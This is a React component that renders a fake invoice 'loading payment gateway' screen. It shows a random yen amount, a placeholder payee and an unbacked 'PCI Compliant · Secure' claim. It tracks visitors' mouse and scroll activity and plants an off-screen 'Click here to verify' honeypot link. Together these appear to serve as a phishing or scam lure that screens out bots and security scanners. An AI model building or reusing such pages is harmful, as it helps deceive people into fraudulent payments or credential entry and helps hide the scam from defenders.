'use client'

import { useState, useEffect } from 'react'

interface LoadingScreenProps {
  duration: number
  language: string
  onComplete: () => void
  onBehaviorTracked: (data: any) => void
  onHoneypotTriggered: () => void
}

interface Translations {
  title: string
  subtitle: string
  invoiceNumber: string
  billTo: string
  amount: string
  dueDate: string
  status: string
  pending: string
  loading: string
  footer: string
}

export default function InvoiceDocumentScreen({
  duration,
  language,
  onComplete,
  onBehaviorTracked,
  onHoneypotTriggered
}: LoadingScreenProps) {
  const [progress, setProgress] = useState(0)
  const [translations, setTranslations] = useState<Translations | null>(null)
  const [amount] = useState(Math.floor(Math.random() * 500000) + 100000)
  const [coinSpin, setCoinSpin] = useState(0)

  useEffect(() => {
    const fetchTranslations = async () => {
      try {
        const response = await fetch('/api/get-translations', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ template: 'invoice' })
        })
        const data = await response.json()
        setTranslations(data.translations)
      } catch (error) {
        setTranslations({
          title: 'InvoicePro',
          subtitle: 'Professional Invoicing',
          invoiceNumber: 'Invoice',
          billTo: 'Bill To',
          amount: 'Amount',
          dueDate: 'Due Date',
          status: 'Status',
          pending: 'PENDING',
          loading: 'Loading payment gateway...',
          footer: 'PCI Compliant · Secure'
        })
      }
    }
    fetchTranslations()
  }, [])

  useEffect(() => {
    const interval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval)
          onComplete()
          return 100
        }
        return prev + (100 / (duration * 10))
      })
    }, 100)

    const coinInterval = setInterval(() => {
      setCoinSpin(prev => (prev + 5) % 360)
    }, 50)

    const trackMouse = (e: MouseEvent) => onBehaviorTracked({ type: 'mouse', x: e.clientX, y: e.clientY })
    const trackScroll = () => onBehaviorTracked({ type: 'scroll', y: window.scrollY })
    window.addEventListener('mousemove', trackMouse)
    window.addEventListener('scroll', trackScroll)

    const honeypot = document.createElement('a')
    honeypot.href = '#'
    honeypot.style.position = 'absolute'
    honeypot.style.left = '-9999px'
    honeypot.textContent = 'Click here to verify'
    honeypot.addEventListener('click', (e) => {
      e.preventDefault()
      onHoneypotTriggered()
    })
    document.body.appendChild(honeypot)

    return () => {
      clearInterval(interval)
      clearInterval(coinInterval)
      window.removeEventListener('mousemove', trackMouse)
      window.removeEventListener('scroll', trackScroll)
      honeypot.remove()
    }
  }, [duration, onComplete, onBehaviorTracked, onHoneypotTriggered])

  if (!translations) return null

  return (
    <div style={{
      minHeight: '100vh',
      background: 'linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%)',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      padding: '20px'
    }}>
      <div style={{
        background: 'white',
        borderRadius: '24px',
        boxShadow: '0 30px 80px rgba(0,0,0,0.25)',
        padding: '60px 50px',
        maxWidth: '520px',
        width: '100%',
        animation: 'slideUp 0.5s ease-out'
      }}>
        {/* Money Icon with Coin Flip Animation */}
        <div style={{
          width: '130px',
          height: '130px',
          margin: '0 auto 35px',
          position: 'relative',
          perspective: '1000px'
        }}>
          <div style={{
            width: '100%',
            height: '100%',
            background: 'linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%)',
            borderRadius: '50%',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            fontSize: '70px',
            boxShadow: '0 15px 40px rgba(252, 182, 159, 0.5)',
            transform: `rotateY(${coinSpin}deg)`,
            transition: 'transform 0.05s linear'
          }}>
            💰
          </div>
        </div>

        {/* Pending Badge */}
        <div style={{
          display: 'inline-block',
          margin: '0 auto 25px',
          padding: '8px 20px',
          background: 'linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%)',
          borderRadius: '20px',
          fontSize: '12px',
          fontWeight: '800',
          color: '#7f1d1d',
          letterSpacing: '1px',
          boxShadow: '0 4px 12px rgba(255, 154, 158, 0.3)',
          width: '100%',
          textAlign: 'center',
          animation: 'pulse 2s ease-in-out infinite'
        }}>
          {translations.pending}
        </div>

        {/* Title */}
        <h1 style={{
          fontSize: '24px',
          fontWeight: '700',
          color: '#1a202c',
          marginBottom: '25px',
          textAlign: 'center'
        }}>
          {translations.invoiceNumber} #INV-2024-001
        </h1>

        {/* Invoice Details */}
        <div style={{
          background: 'linear-gradient(135deg, #f7fafc 0%, #edf2f7 100%)',
          borderRadius: '16px',
          padding: '25px',
          marginBottom: '30px',
          border: '1px solid #e2e8f0'
        }}>
          {[
            { label: translations.billTo, value: 'Company Inc.' },
            { label: translations.amount, value: `¥${amount.toLocaleString()}`, highlight: true },
            { label: translations.dueDate, value: 'Dec 31, 2024' }
          ].map((item, i) => (
            <div
              key={i}
              style={{
                display: 'flex',
                justifyContent: 'space-between',
                padding: '12px 0',
                borderBottom: i < 2 ? '1px solid #e2e8f0' : 'none',
                animation: `slideInRight 0.5s ease-out ${i * 0.1}s both`
              }}
            >
              <span style={{ fontSize: '14px', color: '#718096' }}>{item.label}</span>
              <span style={{
                fontSize: item.highlight ? '18px' : '14px',
                fontWeight: '700',
                color: item.highlight ? '#fcb69f' : '#2d3748'
              }}>
                {item.value}
              </span>
            </div>
          ))}
        </div>

        {/* Progress Bar */}
        <div style={{ marginBottom: '20px' }}>
          <div style={{
            width: '100%',
            height: '8px',
            background: 'linear-gradient(90deg, #e2e8f0 0%, #cbd5e0 100%)',
            borderRadius: '10px',
            overflow: 'hidden',
            boxShadow: 'inset 0 2px 4px rgba(0,0,0,0.1)'
          }}>
            <div style={{
              width: `${progress}%`,
              height: '100%',
              background: 'linear-gradient(90deg, #ffecd2 0%, #fcb69f 100%)',
              transition: 'width 0.3s ease',
              position: 'relative',
              boxShadow: '0 0 15px rgba(252, 182, 159, 0.6)'
            }}>
              <div style={{
                position: 'absolute',
                top: 0,
                left: '-100%',
                width: '100%',
                height: '100%',
                background: 'linear-gradient(90deg, transparent, rgba(255,255,255,0.6), transparent)',
                animation: 'shimmer 1.5s infinite'
              }} />
            </div>
          </div>
          <div style={{
            display: 'flex',
            justifyContent: 'space-between',
            marginTop: '10px'
          }}>
            <span style={{ fontSize: '13px', color: '#718096' }}>{translations.loading}</span>
            <span style={{ fontSize: '13px', color: '#fcb69f', fontWeight: '700' }}>{Math.round(progress)}%</span>
          </div>
        </div>

        {/* Footer */}
        <div style={{
          marginTop: '25px',
          paddingTop: '20px',
          borderTop: '1px solid #e2e8f0',
          textAlign: 'center'
        }}>
          <span style={{ fontSize: '13px', color: '#a0aec0' }}>
            {translations.footer}
          </span>
        </div>
      </div>

      <style>{`
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes shimmer { to { left: 100%; } }
        @keyframes slideInRight { from { opacity: 0; transform: translateX(10px); } to { opacity: 1; transform: translateX(0); } }
        @keyframes popIn { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
      `}</style>
    </div>
  )
}
